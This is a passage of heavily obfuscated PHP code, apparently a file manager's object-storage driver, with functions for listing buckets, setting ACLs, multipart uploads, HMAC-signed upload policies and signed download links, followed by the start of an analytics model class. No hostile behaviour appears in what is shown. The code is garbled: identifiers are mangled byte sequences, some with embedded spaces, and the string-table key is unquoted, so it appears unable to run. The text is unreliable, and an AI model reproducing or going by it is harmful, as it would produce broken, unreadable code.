$cä„“Ò™é– => $Aƒ¤„öŒÁ) { $dÓÎˆÛÒ‡Ú[$bĞÅŒÀï™[74]][$cä„“Ò™é–] = $this->fileInfo($Aƒ¤„öŒÁ[$bĞÅŒÀï™[28]], $Aƒ¤„öŒÁ); } return $dÓÎˆÛÒ‡Ú; } public function has($AäÌ›Åº­©, $fÕ„Å•‚ñ = false, $CŒ„ÑÉÇèº = true) { goto aÉÏíªâù; D ÇŠå„Ú: $fİ¯ãôªİÂ = $a¤¡¢ß£¼[33]; $D•³ôó í£ = 500; $F‘•›‚„‡Ü = 0; goto C®ğ¡Î¸ĞÍ; aÉÏíªâù: $a¤¡¢ß£¼ =& $_SERVER[‘®…¢À]; $AäÌ›Åº­© = trim($AäÌ›Åº­©, $a¤¡¢ß£¼[8]); $Còã¼ğ¡Éå = empty($AäÌ›Åº­©) ? $a¤¡¢ß£¼[33] : $AäÌ›Åº­© . $a¤¡¢ß£¼[8]; goto D ÇŠå„Ú; F¤ôÕ“‹ƒ‘: return !1; goto a·¾ªÅ¹¥‰; C®ğ¡Î¸ĞÍ: $dí»ÏÙæÜ˜ = 0; while (!0) { $D«øíø’ìµ = array($a¤¡¢ß£¼[1132] => $a¤¡¢ß£¼[8], $a¤¡¢ß£¼[183] => $Còã¼ğ¡Éå, $a¤¡¢ß£¼[1133] => $D•³ôó í£, $a¤¡¢ß£¼[1134] => $fİ¯ãôªİÂ); try { $fŠå°ë¥«Ş = $this->client->listObjects($this->bucket, $D«øíø’ìµ); } catch (OSS\Core\OssException $Bõà¯¡ÓÙ) { break; } $fİ¯ãôªİÂ = $fŠå°ë¥«Ş->getNextMarker(); $cğšî¤«ï¡ = $fŠå°ë¥«Ş->getObjectList(); $A«çñÑÅÕ™ = $fŠå°ë¥«Ş->getPrefixList(); if ($fÕ„Å•‚ñ) { if (count($cğšî¤«ï¡) > 1 || count($cğšî¤«ï¡) == 1 && $cğšî¤«ï¡[0]->getKey() != $Còã¼ğ¡Éå) { $F‘•›‚„‡Ü += count($cğšî¤«ï¡) - 1; } if (!empty($A«çñÑÅÕ™)) { $dí»ÏÙæÜ˜ += count($A«çñÑÅÕ™); } if ($fİ¯ãôªİÂ === $a¤¡¢ß£¼[33]) { break; } continue; } if ($CŒ„ÑÉÇèº) { if (!empty($cğšî¤«ï¡)) { if (count($cğšî¤«ï¡) > 1 || $cğšî¤«ï¡[0]->getKey() != $Còã¼ğ¡Éå) { return !0; } } } else { if (!empty($A«çñÑÅÕ™)) { return !0; } } if ($fİ¯ãôªİÂ === $a¤¡¢ß£¼[33]) { break; } } if ($fÕ„Å•‚ñ) { return array($a¤¡¢ß£¼[188] => $F‘•›‚„‡Ü, $a¤¡¢ß£¼[189] => $dí»ÏÙæÜ˜); } goto F¤ôÕ“‹ƒ‘; a·¾ªÅ¹¥‰: } public function listAll($bÄõìî‹”ø) { $cÔÃÊóß±æ =& $_SERVER[‘®…¢À]; $D×—Ş×²Ş³ = $this->fileList($bÄõìî‹”ø, $cÔÃÊóß±æ[33], !0); $e‹‹•´Ìğ = array(); foreach ($D×—Ş×²Ş³[$cÔÃÊóß±æ[74]] as $F‹Ê·ŠÙšÕ) { $e‹‹•´Ìğ[$F‹Ê·ŠÙšÕ[$cÔÃÊóß±æ[28]]] = $F‹Ê·ŠÙšÕ[$cÔÃÊóß±æ[78]]; } return $this->listAllFiles($bÄõìî‹”ø, array_keys($e‹‹•´Ìğ), $e‹‹•´Ìğ); } public function canRead($AˆØŸÔÊŠ§) { $fÜ‰àÅƒì¾ =& $_SERVER[‘®…¢À]; $c†’ïÙë‡Š = $this->pathAcl($AˆØŸÔÊŠ§); return $c†’ïÙë‡Š == $fÜ‰àÅƒì¾[1145] || $c†’ïÙë‡Š == $fÜ‰àÅƒì¾[482] ? !0 : !1; } public function canWrite($d‘ÂÑğ×É) { $f‚Ö†‰¹›» = $this->pathAcl($d‘ÂÑğ×É); return $f‚Ö†‰¹›» == $_SERVER[‘®…¢À][482] ? !0 : !1; } public function pathAcl($Cµ¨Ëà‘) { goto BÇÍ»µ¿’„; BÇÍ»µ¿’„: $B«Èå‘Šš³ =& $_SERVER[‘®…¢À]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $C†·†ßÒñ– = $this->client->getObjectAcl($this->bucket, $Cµ¨Ëà‘); } catch (OSS\Core\OssException $f°Æ›ƒç¾) { return !1; } goto FíÈôä«§Ì; FíÈôä«§Ì: $D½²¦²ŞÛ¤ = $C†·†ßÒñ– == $B«Èå‘Šš³[34] ? $this->bucketAcl : $C†·†ßÒñ–; if ($D½²¦²ŞÛ¤ == $B«Èå‘Šš³[1146]) { return $B«Èå‘Šš³[1145]; } if ($D½²¦²ŞÛ¤ == $B«Èå‘Šš³[1147]) { return $B«Èå‘Šš³[482]; } goto a”ƒ¦Œƒ—¡; a”ƒ¦Œƒ—¡: return $D½²¦²ŞÛ¤; goto AÁ¾éèóåà; AÁ¾éèóåà: } private function chmodPath($B×¡è´™‰, $C Û†ÏÁËß = '') { $C¹Ç¾æ»¹÷ =& $_SERVER[‘®…¢À]; $DÏ£Óš…ÁÕ = empty($C Û†ÏÁËß) ? $C¹Ç¾æ»¹÷[1147] : $C Û†ÏÁËß; $eä…Ù¯ß×¾ = array($C¹Ç¾æ»¹÷[34], $C¹Ç¾æ»¹÷[182], $C¹Ç¾æ»¹÷[1146], $C¹Ç¾æ»¹÷[1147]); if (!in_array($DÏ£Óš…ÁÕ, $eä…Ù¯ß×¾)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $B×¡è´™‰, $DÏ£Óš…ÁÕ); } catch (OSS\Core\OssException $dô¦“–õ×Ë) { return !1; } return !0; } public function getContent($c™áß×÷æ) { return $this->fileSubstr($c™áß×÷æ, -1); } public function setContent($cİ¼£¼…ÁŸ, $cšãƒ×Ì½‘ = '') { $Fã‰çƒ…œé =& $_SERVER[‘®…¢À]; try { $Bæ ¡ » = $this->trafficLimit($Fã‰çƒ…œé[1148]); $A©ÆåË±Ë = $this->client->putObject($this->bucket, $cİ¼£¼…ÁŸ, $cšãƒ×Ì½‘, $Bæ ¡ »); } catch (OSS\Core\OssException $a“»äİÑÁÑ) { return !1; } $aÀ§š‘ÕÎ± = array($Fã‰çƒ…œé[1135] => trim($A©ÆåË±Ë[$Fã‰çƒ…œé[1149]], $Fã‰çƒ…œé[114]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($cİ¼£¼…ÁŸ))); $this->updateObjMeta($cİ¼£¼…ÁŸ, $aÀ§š‘ÕÎ±); return isset($A©ÆåË±Ë[$Fã‰çƒ…œé[1150]][$Fã‰çƒ…œé[1096]]) ? (int) $A©ÆåË±Ë[$Fã‰çƒ…œé[1150]][$Fã‰çƒ…œé[1096]] : strlen($A©ÆåË±Ë); } private function updateObjMeta($bÇÎç’ ²À, $B¸¨¢«ôñ) { try { $CÖÓÙ‡¿’ = array(OSS\OssClient::OSS_HEADERS => $B¸¨¢«ôñ); $this->client->copyObject($this->bucket, $bÇÎç’ ²À, $this->bucket, $bÇÎç’ ²À, $CÖÓÙ‡¿’); } catch (OSS\Core\OssException $e·¾£­ÆİÖ) { return !1; } return !0; } public function upload($F¨ÅÁ°ÎÉ, $b³¨§¢ôŒ, $B£ñÑ©«¬ = false, $A±ÂÑù‘÷ = REPEAT_REPLACE) { $Eæ´²…ãŒí =& $_SERVER[‘®…¢À]; $aë²šßŞ‹¿ = trim($F¨ÅÁ°ÎÉ, $Eæ´²…ãŒí[8]); $f¶º—™“§é = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => $this->osChunkSize(), OSS\OssClient::OSS_HEADERS => array($Eæ´²…ãŒí[1135] => @md5_file($b³¨§¢ôŒ)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($F¨ÅÁ°ÎÉ))); $f¶º—™“§é = $this->trafficLimit($Eæ´²…ãŒí[1148], $f¶º—™“§é); try { $this->client->multiuploadFile($this->bucket, $aë²šßŞ‹¿, $b³¨§¢ôŒ, $f¶º—™“§é); } catch (OSS\Core\OssException $Cğø¾“ÎÕ) { return !1; } return $this->getPathOuter($F¨ÅÁ°ÎÉ); } public function getHost() { $aç÷¡Î”œ· =& $_SERVER[‘®…¢À]; $câ¥®¢ÔµÚ = explode($aç÷¡Î”œ·[168], parent::getHost()); return $câ¥®¢ÔµÚ[0] . $aç÷¡Î”œ·[168] . $this->bucket . $aç÷¡Î”œ·[94] . $câ¥®¢ÔµÚ[1]; } public function uploadFormData($bÚŒ‹Îî„, $eî×Ø¼×£ò = 3600) { goto Aëò¿Îè´ô; bËÌêö°‚: $a–Ó’¥ò¦ğ = $this->pathFather($bÚŒ‹Îî„); $CÌ½ªäÕ¥µ = array($f‡’‰‚—ê[1052] => $d¨ĞÊñÊß , $f‡’‰‚—ê[1053] => array(array($f‡’‰‚—ê[1153], 0, $BĞ“ø°‡¹¿), array($f‡’‰‚—ê[1056], $f‡’‰‚—ê[1057], $a–Ó’¥ò¦ğ))); $A¨óòë¢‘ = base64_encode(json_encode($CÌ½ªäÕ¥µ)); goto a­›‹œãÇ; aÀ±Û‘¨: $f©è›±ÂÆÒ = strpos($d¨ĞÊñÊß , $f‡’‰‚—ê[281]); $d¨ĞÊñÊß  = substr($d¨ĞÊñÊß , 0, $f©è›±ÂÆÒ) . $f‡’‰‚—ê[1152]; $BĞ“ø°‡¹¿ = 1048576000 * 5; goto bËÌêö°‚; FËâ¥àÏœÁ: $d¦éìÁ— = date($f‡’‰‚—ê[1151], time() + $CŸË†ÍÌ­); $FÔ‘İì«¿ = new DateTime($d¦éìÁ—); $d¨ĞÊñÊß  = $FÔ‘İì«¿->format(DateTime::ISO8601); goto aÀ±Û‘¨; a­›‹œãÇ: $EîÂ‹šºÀÈ = base64_encode(hash_hmac($f‡’‰‚—ê[215], $A¨óòë¢‘, $this->secret, !0)); $BŞªòÍäêÃ = array($f‡’‰‚—ê[1062] => $A¨óòë¢‘, $f‡’‰‚—ê[1154] => $this->accessKey, $f‡’‰‚—ê[1058] => $f‡’‰‚—ê[1050], $f‡’‰‚—ê[1155] => $EîÂ‹šºÀÈ, $f‡’‰‚—ê[166] => $cÃñÊ‰Ãá); $BŞªòÍäêÃ = $this->trafficLimit($f‡’‰‚—ê[1148], $BŞªòÍäêÃ); goto càİö¾”¯â; càİö¾”¯â: return $BŞªòÍäêÃ; goto AòµÃÆÔæ ; Aëò¿Îè´ô: $f‡’‰‚—ê =& $_SERVER[‘®…¢À]; if (!($cÃñÊ‰Ãá = $this->getHost())) { return !1; } $CŸË†ÍÌ­ = $eî×Ø¼×£ò; goto FËâ¥àÏœÁ; AòµÃÆÔæ : } public function multiUploadFormData($f„óŠÎÒåê, $c÷‘Š’µÈ = 3600) { $b¡·šÈ†… =& $_SERVER[‘®…¢À]; if (!($d³«ñ‘¯ = $this->getHost())) { return !1; } $aæ…ÌƒÒÉ‚ = $this->trafficLimit($b¡·šÈ†…[1148]); $f½Ñ»ÁŒä– = $this->client->initiateMultipartUpload($this->bucket, $f„óŠÎÒåê, $aæ…ÌƒÒÉ‚); return array($b¡·šÈ†…[206] => $f½Ñ»ÁŒä–, $b¡·šÈ†…[166] => $d³«ñ‘¯ . $b¡·šÈ†…[8] . $this->pathEncode($f„óŠÎÒåê), $b¡·šÈ†…[207] => gmdate($b¡·šÈ†…[1156]), $b¡·šÈ†…[90] => $f„óŠÎÒåê); } public function multiUploadAuthData($a¯à™êÎ½, $EÔ±ãŒÖ = array()) { goto BÇ×œ–Ë†; BÇ×œ–Ë†: $AŸë”¸ã =& $_SERVER[‘®…¢À]; $eˆ¤–íàÜ = isset($EÔ±ãŒÖ[$AŸë”¸ã[207]]) ? $EÔ±ãŒÖ[$AŸë”¸ã[207]] : gmdate($AŸë”¸ã[1156]); $bÄç‘„œÕÅ = isset($EÔ±ãŒÖ[$AŸë”¸ã[157]]) ? $EÔ±ãŒÖ[$AŸë”¸ã[157]] : $AŸë”¸ã[33]; goto DŠ™Îƒ•ñ; DŠ™Îƒ•ñ: $f‚¶ò×éè = $a¯à™êÎ½; if (isset($EÔ±ãŒÖ[$AŸë”¸ã[90]])) { $f‚¶ò×éè = $EÔ±ãŒÖ[$AŸë”¸ã[90]]; unset($EÔ±ãŒÖ[$AŸë”¸ã[90]]); } if (isset($EÔ±ãŒÖ[$AŸë”¸ã[208]])) { $EÔ±ãŒÖ[$AŸë”¸ã[207]] = $eˆ¤–íàÜ; return $this->listUploadParts($f‚¶ò×éè, $EÔ±ãŒÖ); } goto a¬³šã”·¢; a¬³šã”·¢: $AÎÉÅÓèµ = array($AŸë”¸ã[209], $AŸë”¸ã[33], $AŸë”¸ã[117], $eˆ¤–íàÜ, "\x78\55\157\x73\x73\x2d\144\x61\164\x65\x3a{$eˆ¤–íàÜ}", $AŸë”¸ã[8] . $this->bucket . $AŸë”¸ã[8] . $f‚¶ò×éè . $bÄç‘„œÕÅ); if (strpos($bÄç‘„œÕÅ, $AŸë”¸ã[210]) === 0) { $AÎÉÅÓèµ[0] = $AŸë”¸ã[211]; if ($b¸œ´ŸÓ‚ = $this->trafficLimit($AŸë”¸ã[1148])) { $f‚¶ò×éè = $AŸë”¸ã[1157]; array_splice($AÎÉÅÓèµ, 5, 0, $f‚¶ò×éè . $AŸë”¸ã[4] . $b¸œ´ŸÓ‚[$f‚¶ò×éè]); } } if (isset($EÔ±ãŒÖ[$AŸë”¸ã[212]]) && $EÔ±ãŒÖ[$AŸë”¸ã[212]] == $AŸë”¸ã[213]) { $AÎÉÅÓèµ[0] = $AŸë”¸ã[213]; } goto BÅ¶Á­À; CŠí†šœÍ®: $a¶Ìò­¡ô¥ = $AŸë”¸ã[1159] . $this->accessKey . $AŸë”¸ã[4] . $AÕÚ‹ãÑèø; if (strpos($bÄç‘„œÕÅ, $AŸë”¸ã[210]) === 0) { $a¶Ìò­¡ô¥ = array($AŸë”¸ã[217] => $a¶Ìò­¡ô¥, $AŸë”¸ã[207] => $eˆ¤–íàÜ); if ($b¸œ´ŸÓ‚) { $a¶Ìò­¡ô¥ = array_merge($a¶Ìò­¡ô¥, $b¸œ´ŸÓ‚); } } return $a¶Ìò­¡ô¥; goto DšÊÍ‘çÉ©; BÅ¶Á­À: if (!empty($EÔ±ãŒÖ[$AŸë”¸ã[1158]])) { $b²Úø‰äµ = array_merge(array($AÎÉÅÓèµ[4]), $EÔ±ãŒÖ[$AŸë”¸ã[1158]]); sort($b²Úø‰äµ); $AÎÉÅÓèµ[4] = implode($AŸë”¸ã[214], $b²Úø‰äµ); } $fÌ‘ÁÎ—ˆà = implode($AŸë”¸ã[214], $AÎÉÅÓèµ); $AÕÚ‹ãÑèø = base64_encode(hash_hmac($AŸë”¸ã[215], $fÌ‘ÁÎ—ˆà, $this->secret, !0)); goto CŠí†šœÍ®; DšÊÍ‘çÉ©: } public function listUploadParts($fãˆïÆŒ†, $d¹ÉùÃ§ª¸) { goto Cœ“Ò¤‘È; cö©ÃœÈøó: $C„›Œ›ÏŠŠ = $e‹’øÅ§ôÊ->getListPart(); $a„Š¡ÛÍ = array(); foreach ($C„›Œ›ÏŠŠ as $b•ª©ù–à­) { $a„Š¡ÛÍ[] = array($eÏÇ¦ßÀÊ[1139] => $b•ª©ù–à­->getPartNumber(), $eÏÇ¦ßÀÊ[1140] => trim($b•ª©ù–à­->getETag(), $eÏÇ¦ßÀÊ[114])); } goto A„ƒÒ‘Ñ; AÍ¸½°ãğ: return array($eÏÇ¦ßÀÊ[217] => $eŞ§©¿‚±¢, $eÏÇ¦ßÀÊ[207] => $d¹ÉùÃ§ª¸[$eÏÇ¦ßÀÊ[207]], $eÏÇ¦ßÀÊ[219] => $a„Š¡ÛÍ); goto dâçÙˆ¡ÈÇ; Cœ“Ò¤‘È: $eÏÇ¦ßÀÊ =& $_SERVER[‘®…¢À]; $CÎªÈŸ¤À¼ = parse_url_query($d¹ÉùÃ§ª¸[$eÏÇ¦ßÀÊ[157]]); $e‹’øÅ§ôÊ = $this->client->listParts($this->bucket, $fãˆïÆŒ†, $CÎªÈŸ¤À¼[$eÏÇ¦ßÀÊ[206]]); goto cö©ÃœÈøó; A„ƒÒ‘Ñ: unset($d¹ÉùÃ§ª¸[$eÏÇ¦ßÀÊ[208]], $d¹ÉùÃ§ª¸[$eÏÇ¦ßÀÊ[212]]); $eŞ§©¿‚±¢ = $this->multiUploadAuthData($fãˆïÆŒ†, $d¹ÉùÃ§ª¸); if (empty($eŞ§©¿‚±¢)) { return !1; } goto AÍ¸½°ãğ; dâçÙˆ¡ÈÇ: } public function download($DË½ñî’, $f’ñâ—ğ•˜) { if ($this->isFolder($DË½ñî’)) { return !1; } try { $dïäÂ„ê‰¼ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $f’ñâ—ğ•˜); $dïäÂ„ê‰¼ = $this->trafficLimit($_SERVER[‘®…¢À][106], $dïäÂ„ê‰¼); $this->client->getObject($this->bucket, $DË½ñî’, $dïäÂ„ê‰¼); } catch (OSS\Core\OssException $A´Ù‚£Ÿ¥) { return !1; } return $f’ñâ—ğ•˜; } public function fileSubstr($D·Ôê–‚Õ£, $bĞ¥öŒ­„ = 0, $CÆµÅ‘í»ï = false) { if ($bĞ¥öŒ­„ === -1) { $B·Œ§İ¶Ü„ = array(); } else { if ($CÆµÅ‘í»ï === !1) { $E§ĞÒºìÏ» = $this->size($D·Ôê–‚Õ£); } else { $E§ĞÒºìÏ» = $bĞ¥öŒ­„ + $CÆµÅ‘í»ï - 1; } $B·Œ§İ¶Ü„ = array(OSS\OssClient::OSS_RANGE => "{$bĞ¥öŒ­„}\55{$E§ĞÒºìÏ»}"); } try { return $this->client->getObject($this->bucket, $D·Ôê–‚Õ£, $B·Œ§İ¶Ü„); } catch (OSS\Core\OssException $D¯ÒÏß‹ğ) { think_exception($D¯ÒÏß‹ğ->getMessage()); return !1; } } private function trafficLimit($c³ì¤ºÄï†, $eäå†˜è = array()) { goto Fò„¶›®Šô; e¡À±‚¶â: return $eäå†˜è; goto AÚ‚“Ö¯õ­; cŠëÄêÒó: if (!$AÄÓá­Ê™†) { return $eäå†˜è; } $AÄÓá­Ê™† = $AÄÓá­Ê™† < 819200 ? 819200 : ($AÄÓá­Ê™† > 838860800 ? 838860800 : $AÄÓá­Ê™†); $eäå†˜è[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($AÄÓá­Ê™†); goto e¡À±‚¶â; Fò„¶›®Šô: $cÑÂ–ºŸƒ =& $_SERVER[‘®…¢À]; if ($c³ì¤ºÄï† == $cÑÂ–ºŸƒ[1148] && $this->isUploadServer() || $c³ì¤ºÄï† == $cÑÂ–ºŸƒ[106] && $this->isFileOutServer()) { return $eäå†˜è; } $AÄÓá­Ê™† = floatval($GLOBALS[$cÑÂ–ºŸƒ[6]][$cÑÂ–ºŸƒ[85]][$cÑÂ–ºŸƒ[92]][$c³ì¤ºÄï†]) * 1024 * 1024 * 8; goto cŠëÄêÒó; AÚ‚“Ö¯õ­: } public function link($cÅôÔ‚¯°‡, $b’¿Ú…É‘à = array()) { $AäŒ©î‡£¬ =& $_SERVER[‘®…¢À]; if (!$this->exist($cÅôÔ‚¯°‡) || $this->isFolder($cÅôÔ‚¯°‡)) { return !1; } try { $b’¿Ú…É‘à = $this->trafficLimit($AäŒ©î‡£¬[106], $b’¿Ú…É‘à); $aê³áİöã„ = $this->client->signUrl($this->bucket, $cÅôÔ‚¯°‡, 3600 * 12, $AäŒ©î‡£¬[213], $b’¿Ú…É‘à); return $this->getCdnLink($aê³áİöã„); } catch (OSS\Core\OssException $a‚‚Œ¨Äƒ) { return !1; } } public function fileOut($cÅ¤ÅÌ¼Ö», $eùî’ŒÛä = false, $CÚ«ŸÚí…ï = false, $b»ÊÓÜÏ…± = '') { goto A§¬÷÷…©; A§¬÷÷…©: $FÌÛªí•• =& $_SERVER[‘®…¢À]; if (!$CÚ«ŸÚí…ï) { $CÚ«ŸÚí…ï = $this->pathThis($cÅ¤ÅÌ¼Ö»); } $E‡ÂÒåˆ = get_file_mime(get_path_ext($CÚ«ŸÚí…ï)); goto fÃÁ”£øğ; a’†±è‡º´: $eÒ‹ëáæ²[OSS\OssClient::OSS_SUB_RESOURCE] .= $FÌÛªí••[1161] . $E‡ÂÒåˆ; $eßÖâœìğå = $this->link($cÅ¤ÅÌ¼Ö», $eÒ‹ëáæ²); $this->fileOutLink($eßÖâœìğå); goto E¹öÔÉÏñ‡; fÃÁ”£øğ: if ($E‡ÂÒåˆ == $FÌÛªí••[198]) { return parent::fileOut($cÅ¤ÅÌ¼Ö», $eùî’ŒÛä, $CÚ«ŸÚí…ï, $b»ÊÓÜÏ…±); } $eùî’ŒÛä = $eùî’ŒÛä ? $FÌÛªí••[199] : $FÌÛªí••[200]; $eÒ‹ëáæ² = array(OSS\OssClient::OSS_SUB_RESOURCE => $FÌÛªí••[1160] . rawurlencode("{$eùî’ŒÛä}\x3b\x66\x69\x6c\x65\x6e\x61\155\x65\x3d{$CÚ«ŸÚí…ï}")); goto a’†±è‡º´; E¹öÔÉÏñ‡: } public function fileOutServer($aøÑÄµË–Í, $a¹ë×ÚÛßÏ = false, $Eä®¹ÛÏˆè = false, $E±Şù¦Øøç = '') { parent::fileOut($aøÑÄµË–Í, $a¹ë×ÚÛßÏ, $Eä®¹ÛÏˆè, $E±Şù¦Øøç); } public function fileOutImage($D¨¥ï‰ã›, $F½ÊŒÖ“ä¯ = 250) { $AÕ¸¬–ì¯ß = array(OSS\OssClient::OSS_PROCESS => $_SERVER[‘®…¢À][1162] . $F½ÊŒÖ“ä¯); $e´Òƒ°æ½ = $this->link($D¨¥ï‰ã›, $AÕ¸¬–ì¯ß); $this->fileOutLink($e´Òƒ°æ½); } public function fileOutImageServer($e…äªëòê, $c´­‰’Ä = 250) { parent::fileOutImage($e…äªëòê, $c´­‰’Ä); } public function fileOutLink($AâŞêæÅÂœ) { $c×õ©š‰‰™ =& $_SERVER[‘®…¢À]; if (!$this->isCdnHost() && substr($AâŞêæÅÂœ, 0, 7) == $c×õ©š‰‰™[1065]) { $AâŞêæÅÂœ = $c×õ©š‰‰™[1066] . substr($AâŞêæÅÂœ, 7); } header($c×õ©š‰‰™[153] . $AâŞêæÅÂœ); die; } public function hashMd5($D‡ï¾Øä…•, $fÓÉ²‹¸Œ† = '') { $fªø¹³­²Ù =& $_SERVER[‘®…¢À]; $BŸõÔ†Âøá = $this->objectMeta($D‡ï¾Øä…•); if (!$BŸõÔ†Âøá) { return $fªø¹³­²Ù[33]; } if (!isset($BŸõÔ†Âøá[$fªø¹³­²Ù[1135]]) && !empty($fÓÉ²‹¸Œ†)) { $B“¸½¨¥ÍÖ = $this->updateObjMeta($D‡ï¾Øä…•, array($fªø¹³­²Ù[1135] => $fÓÉ²‹¸Œ†)); $BŸõÔ†Âøá[$fªø¹³­²Ù[1135]] = $B“¸½¨¥ÍÖ ? $fÓÉ²‹¸Œ† : $fªø¹³­²Ù[33]; } return isset($BŸõÔ†Âøá[$fªø¹³­²Ù[1135]]) ? strtolower($BŸõÔ†Âøá[$fªø¹³­²Ù[1135]]) : $fªø¹³­²Ù[33]; } public function size($dªÉ…äŞÁ¿) { $CœÕÎÈâóù = $this->objectMeta($dªÉ…äŞÁ¿); return $CœÕÎÈâóù ? $CœÕÎÈâóù[$_SERVER[‘®…¢À][78]] : 0; } public function info($b‘ÛÚÂôèê) { if ($this->isFolder($b‘ÛÚÂôèê)) { return $this->folderInfo($b‘ÛÚÂôèê); } else { if ($this->isFile($b‘ÛÚÂôèê)) { return $this->fileInfo($b‘ÛÚÂôèê); } } return !1; } public function exist($A‡‘ÁÚ) { return $this->isFile($A‡‘ÁÚ) || $this->isFolder($A‡‘ÁÚ); } public function isFile($fŠÎÆ‡­¡ñ) { return !$this->isFolder($fŠÎÆ‡­¡ñ) && $this->objectMeta($fŠÎÆ‡­¡ñ); } public function isFolder($Aƒéô¤³¢) { return $this->cacheMethod($_SERVER[‘®…¢À][220], $Aƒéô¤³¢); } protected function objectMeta($B·Ç•–êÛØ) { return $this->cacheMethod($_SERVER[‘®…¢À][221], $B·Ç•–êÛØ); } protected function _objectMeta($eÃ•œ´ˆ†ğ) { $A‰Œ†Èî¦ =& $_SERVER[‘®…¢À]; try { $a¿™¡Êøø = $this->client->getObjectMeta($this->bucket, $eÃ•œ´ˆ†ğ); } catch (OSS\Core\OssException $fÉ¹¨«ß¤Œ) { $a¿™¡Êøø = !1; } if ($a¿™¡Êøø) { $a¿™¡Êøø[$A‰Œ†Èî¦[78]] = intval($a¿™¡Êøø[$A‰Œ†Èî¦[1142]]); } return $a¿™¡Êøø; } protected function _isFolder($f‡šñ·É‡î) { $dÁêÄï›‘” =& $_SERVER[‘®…¢À]; if ($f‡šñ·É‡î == $dÁêÄï›‘”[33] || $f‡šñ·É‡î == $dÁêÄï›‘”[8]) { return !0; } $eÚŠìÒßª = array($dÁêÄï›‘”[1132] => $dÁêÄï›‘”[8], $dÁêÄï›‘”[183] => rtrim($f‡šñ·É‡î, $dÁêÄï›‘”[8]) . $dÁêÄï›‘”[8], $dÁêÄï›‘”[1133] => 1, $dÁêÄï›‘”[1134] => $dÁêÄï›‘”[33]); $fÌ¯‘œË¡õ = $this->client->listObjects($this->bucket, $eÚŠìÒßª); if ($fÌ¯‘œË¡õ->getObjectList() || $fÌ¯‘œË¡õ->getPrefixList()) { return !0; } return !1; } } goto c Õ£ÆŞõ; bÖÃ‘›·Ûâ: class AnalysisModel extends ModelBaseLight { public function init($c¼¢ìë“ÃÂ) { $B¾öŒé¼’÷ =& $_SERVER[‘®…¢À]; $c‡Ûš¯«¼¥ = array($B¾öŒé¼’÷[526] => array($B¾öŒé¼’÷[29] => $B¾öŒé¼’÷[1927], $B¾öŒé¼’÷[258] => array($B¾öŒé¼’÷[207], $B¾öŒé¼’÷[673], $B¾öŒé¼’÷[1928], $B¾öŒé¼’÷[1929])), $B¾öŒé¼’÷[1930] => array($B¾öŒé¼’÷[29] => $B¾öŒé¼’÷[1931], $B¾öŒé¼’÷[258] => array($B¾öŒé¼’÷[207], $B¾öŒé¼’÷[671], $B¾öŒé¼’÷[1932], $B¾öŒé¼’÷[1933], $B¾öŒé¼’÷[1934]))); if (!isset($c‡Ûš¯«¼¥[$c¼¢ìë“ÃÂ])) { return !1; } $this->optionType = $c‡Ûš¯«¼¥[$c¼¢ìë“ÃÂ][$B¾öŒé¼’÷[29]]; $this->field = $c‡Ûš¯«¼¥[$c¼¢ìë“ÃÂ][$B¾öŒé¼’÷[258]]; return !0; } public function listData($F‹’‹ÄõŠ™ = false, $C¦Šèƒ”“· = "\155\x6f\144\151\x66\x79\124\151\155\145", $d†¼×šá„ = false) { return parent::listData($F‹’‹ÄõŠ™, $C¦Šèƒ”“·, $d†¼×šá„); } public function trendList($b¼¾¤Ä¾ÂŠ) { goto eùËéîÂ‡; e¢Ü¸¤Ï‰ç: foreach ($bÂ½…ê®µ÷ as $Fî˜Ú†ïŠ) { $this->{$F”ÓĞ×«Ê}($Fî˜Ú†ïŠ); } return $this->listData(); goto aÃ¦¬ÉĞªƒ; dÓ‹‚´‰ÂÎ: if (!isset($DÈòÌ…»À)) { $C¼¹Ğ’±îÈ = $b¼¾¤Ä¾ÂŠ == $båÖé¾È[526] ? $båÖé¾È[468] : $båÖé¾È[735]; $DÈòÌ…»À = Model($C¼¹Ğ’±îÈ)->min($båÖé¾È[184]); } $F”ÓĞ×«Ê = $båÖé¾È[1937] . ucfirst($b¼¾¤Ä¾ÂŠ); $bÂ½…ê®µ÷ = $this->dateList($DÈòÌ…»À); goto e¢Ü¸¤Ï‰ç; eùËéîÂ‡: $båÖé¾È =& $_SERVER[‘®…¢À]; $b¶óÓ ˜£¾ = $this->listData(); if ($b¶óÓ ˜£¾) { $FÅ³Â¼èÜà = end($b¶óÓ ˜£¾); $Fî˜Ú†ïŠ = date($båÖé¾È[1935], strtotime($båÖé¾È[1936])); if ($FÅ³Â¼èÜà[$båÖé¾È[207]] == $Fî˜Ú†ïŠ) { return $b¶óÓ ˜£¾; } $DÈòÌ…»À = strtotime($FÅ³Â¼èÜà[$båÖé¾È[207]]); } goto dÓ‹‚´‰ÂÎ; aÃ¦¬ÉĞªƒ: } private function dateList($fËÊ«ĞŠ½‘) { $c»ˆ ˆÁµ‘ =& $_SERVER[‘®…¢À]; $AÎ¯Áî„Ï™ = $fËÊ«ĞŠ½‘; $Cèí®‚˜˜ = strtotime($c»ˆ ˆÁµ‘[1936]); $D±‡ÜöÍ·Å = array(); while ($AÎ¯Áî„Ï™ <= $Cèí®‚˜˜) { $D±‡ÜöÍ·Å[] = date($c»ˆ ˆÁµ‘[1935], $AÎ¯Áî„Ï™); $AÎ¯Áî„Ï™ = strtotime($c»ˆ ˆÁµ‘[1938], $AÎ¯Áî„Ï™); } return $D±‡ÜöÍ·Å; } public function _recordUser($BÊÕÇÈŸˆÚ = '') { goto aÁõÏÖ˜Ü¤; e—ø‚…Ğö„: $aŠò†¨ì¢­ = Model($d‘¶Ìó…ÂŞ[468])->where($cá¶ Ìİ‡)->count($d‘¶Ìó…ÂŞ[1337]); $cá¶ Ìİ‡[$d‘¶Ìó…ÂŞ[29]] = $d‘¶Ìó…ÂŞ[1941]; $F×ğšß½¥… = Model($d‘¶Ìó…ÂŞ[1942])->where($cá¶ Ìİ‡)->count($d‘¶Ìó…ÂŞ[1943]); goto Aæ¼“ö¯Ÿ; aÁõÏÖ˜Ü¤: $d‘¶Ìó…ÂŞ =& $_SERVER[‘®…¢À]; $BÖ³ÑÒ¶¼¡ = strtotime(date($d‘¶Ìó…ÂŞ[1939], 